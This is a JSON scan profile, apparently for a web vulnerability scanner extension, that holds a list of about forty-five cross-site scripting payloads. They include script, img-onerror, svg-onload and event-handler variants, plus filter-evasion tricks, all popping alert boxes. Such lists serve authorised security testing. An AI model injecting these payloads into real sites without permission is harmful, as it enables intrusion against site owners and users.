[
  {
    "ProfileName": "XSS - POST to GET replace",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@MrW0l05zyn",
    "Payloads": [
      "true,\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e",
      "true,\u003cscr\u003cscript\u003eipt\u003ealert(\u0027XSS\u0027)\u003c/scr\u003cscript\u003eipt\u003e",
      "true,\"\u003e\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e",
      "true,\"\u003e\u003cscript\u003ealert(String.fromCharCode(88,83,83))\u003c/script\u003e",
      "true,\u003cimg src\u003dx onerror\u003dalert(\u0027XSS\u0027);\u003e",
      "true,\u003cimg src\u003dx onerror\u003dalert(\u0027XSS\u0027)//",
      "true,\u003cimg src\u003dx onerror\u003dalert(String.fromCharCode(88,83,83));\u003e",
      "true,\u003cimg src\u003dx oneonerrorrror\u003dalert(String.fromCharCode(88,83,83));\u003e",
      "true,\u003cimg src\u003dx:alert(alt) onerror\u003deval(src) alt\u003dxss\u003e",
      "true,\"\u003e\u003cimg src\u003dx onerror\u003dalert(\u0027XSS\u0027);\u003e",
      "true,\"\u003e\u003cimg src\u003dx onerror\u003dalert(String.fromCharCode(88,83,83));\u003e",
      "true,\u003csvgonload\u003dalert(1)\u003e",
      "true,\u003csvg/onload\u003dalert(\u0027XSS\u0027)\u003e",
      "true,\u003csvg onload\u003dalert(1)//",
      "true,\u003csvg/onload\u003dalert(String.fromCharCode(88,83,83))\u003e",
      "true,\u003csvg id\u003dalert(1) onload\u003deval(id)\u003e",
      "true,\"\u003e\u003csvg/onload\u003dalert(String.fromCharCode(88,83,83))\u003e",
      "true,\"\u003e\u003csvg/onload\u003dalert(/XSS/)",
      "true,\u003csvg\u003e\u003cscript href\u003ddata:,alert(1) /\u003e",
      "true,\u003cdiv onpointerover\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointerdown\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointerenter\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointerleave\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointermove\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointerout\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cdiv onpointerup\u003d\"alert(45)\"\u003eMOVE HERE\u003c/div\u003e",
      "true,\u003cbody onload\u003dalert(/XSS/.source)\u003e",
      "true,\u003cinput autofocus onfocus\u003dalert(1)\u003e",
      "true,\u003cselect autofocus onfocus\u003dalert(1)\u003e",
      "true,\u003ctextarea autofocus onfocus\u003dalert(1)\u003e",
      "true,\u003ckeygen autofocus onfocus\u003dalert(1)\u003e",
      "true,\u003cvideo/poster/onerror\u003dalert(1)\u003e",
      "true,\u003cvideo\u003e\u003csource onerror\u003d\"javascript:alert(1)\"\u003e",
      "true,\u003cvideo src\u003d_ onloadstart\u003d\"alert(1)\"\u003e",
      "true,\u003cdetails/open/ontoggle\u003d\"alert`1`\"\u003e",
      "true,\u003caudio src onloadstart\u003dalert(1)\u003e",
      "true,\u003cmarquee onstart\u003dalert(1)\u003e",
      "true,\u003cmeter value\u003d2 min\u003d0 max\u003d10 onmouseover\u003dalert(1)\u003e2 out of 10\u003c/meter\u003e",
      "true,\u003cbody ontouchstart\u003dalert(1)\u003e",
      "true,\u003cbody ontouchend\u003dalert(1)\u003e",
      "true,\u003cbody ontouchmove\u003dalert(1)\u003e",
      "true,\u003cscript\u003ealert(window.origin)\u003c/script\u003e",
      "true,\u003cimg src\u003d\"\" onerror\u003dalert(window.origin)\u003e",
      "true,\u003cplaintext\u003e",
      "true,\u003cscript\u003eprint()\u003c/script\u003e"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "All",
      "MrW0l05zyn",
      "MrW0l05zyn - XSS"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": true,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 3,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 3,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "XSS - POST to GET replace",
    "IssueSeverity": "Medium",
    "IssueConfidence": "Tentative",
    "IssueDetail": "\u003cbr /\u003e\n\u003cul\u003e\n\u003cli\u003ePayload: \u003ccode\u003e\u003cpayload\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGrep: \u003ccode\u003e\u003cgrep\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      0
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": true,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]